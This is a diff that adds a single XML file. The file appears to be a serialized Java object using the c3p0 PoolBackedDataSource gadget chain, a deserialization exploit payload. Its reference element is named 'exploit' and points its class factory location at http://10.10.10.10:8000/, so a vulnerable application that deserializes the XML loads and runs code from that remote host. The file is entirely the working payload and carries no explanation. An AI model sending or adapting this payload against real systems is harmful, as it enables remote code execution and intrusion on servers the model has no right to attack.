@@ -1,0 +1,22 @@
+<com.mchange.v2.c3p0.PoolBackedDataSource serialization="custom">
+  <unserializable-parents/>
+  <com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase>
+    <short>1</short>
+    <com.mchange.v2.naming.ReferenceIndirector_-ReferenceSerialized>
+      <reference>
+        <className>exploit</className>
+        <addrs/>
+        <classFactory>test</classFactory>
+        <classFactoryLocation>http://10.10.10.10:8000/</classFactoryLocation>
+      </reference>
+    </com.mchange.v2.naming.ReferenceIndirector_-ReferenceSerialized>
+    <null/>
+    <null/>
+    <null/>
+    <null/>
+    <int>0</int>
+  </com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase>
+  <com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource>
+    <short>1</short>
+  </com.mchange.v2.c3p0.impl.AbstractPoolBackedDataSource>
+</com.mchange.v2.c3p0.PoolBackedDataSource>
